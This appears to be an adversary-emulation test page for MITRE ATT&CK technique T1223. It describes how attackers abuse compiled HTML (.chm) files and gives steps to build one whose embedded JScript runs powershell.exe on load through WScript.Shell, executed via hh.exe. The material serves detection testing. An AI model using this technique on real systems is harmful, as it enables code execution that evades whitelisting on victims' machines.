<h1> Tactic: Defense Evasion, Execution
Technique: Compiled HTML File (T1223)  </h1>
<h2> From MITRE ATT&CK </h2>

Compiled HTML files (.chm) are commonly distributed as part of the Microsoft HTML Help system. CHM files are compressed compilations of various content such as HTML documents, images, and scripting/web related programming languages such VBA, JScript, Java, and ActiveX. CHM content is displayed using underlying components of the Internet Explorer browser loaded by the HTML Help executable program (hh.exe).

Adversaries may abuse this technology to conceal malicious code. A custom CHM file containing embedded payloads could be delivered to a victim then triggered by User Execution. CHM execution may also bypass application whitelisting on older and/or unpatched systems that do not account for execution of binaries through hh.exe.

<h2> Test </h2>

Name                  | Description                                                    | Reference
--------------------- | ---------------------------------------------------------------| ------------
PowerShell Execution  | Simulates adversary leveraging custom CHM to launch PowerShell | N/A 

<h3> Test Development </h3>

<h4> Create a custom CHM File </h3>

1. Install HelpNDoc (https://www.helpndoc.com/)
2. Create a new project
3. Choose one of the empty files from the table of contents on the left
4. Select Insert from the top Ribbon and choose Insert > Insert another HTML code
5. Insert the following code; update the domain name:
```
<html>
<head>
<script language="jscript">
function launchCalc()
{
 var WshShell = new ActiveXObject("WScript.Shell");
 WshShell.Run("powershell.exe");
}
</script> 
</head>
<body onload="launchCalc()">
</body>
</html>
```
6. After inserting the above HTML code, navigate to Home in the top ribbon and select Generate CHM documentation
7. Move the generated CHM file to your test system

<h3> Test Execution </h3>

Execute the CHM file generated above using Windows HTML Helper through Windows Command Prompt: 
```
C:\ hh.exe [].chm
```

